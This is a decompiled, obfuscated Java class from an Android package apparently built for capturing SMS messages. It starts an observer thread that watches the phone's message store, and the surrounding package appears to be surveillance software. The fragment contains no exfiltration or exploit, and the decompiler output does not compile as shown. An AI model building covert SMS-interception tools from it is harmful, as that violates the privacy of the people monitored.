package com.vvt.capture.sms.b;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.os.Looper;
import com.vvt.ak.a;
import com.vvt.base.capture.e;
import com.vvt.base.capture.i;
import java.util.Timer;

public class b
  implements e
{
  private static final boolean a = a.a;
  private ContentObserver b;
  private ContentResolver c;
  private Looper d;
  private Thread e;
  private Timer f = null;
  
  public b(ContentResolver paramContentResolver)
  {
    this.c = paramContentResolver;
  }
  
  public void a(i parami)
  {
    Object localObject = this.e;
    if (localObject == null)
    {
      localObject = new com/vvt/capture/sms/b/c;
      String str = "SmsOT";
      ((c)localObject).<init>(this, str, parami);
      this.e = ((Thread)localObject);
      localObject = this.e;
      ((Thread)localObject).start();
    }
  }
  
  public void b()
  {
    Object localObject = this.c;
    if (localObject != null)
    {
      localObject = this.b;
      if (localObject != null)
      {
        localObject = this.c;
        ContentObserver localContentObserver = this.b;
        ((ContentResolver)localObject).unregisterContentObserver(localContentObserver);
      }
    }
    localObject = this.d;
    if (localObject != null)
    {
      localObject = this.d;
      ((Looper)localObject).quit();
    }
    this.e = null;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/sms/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */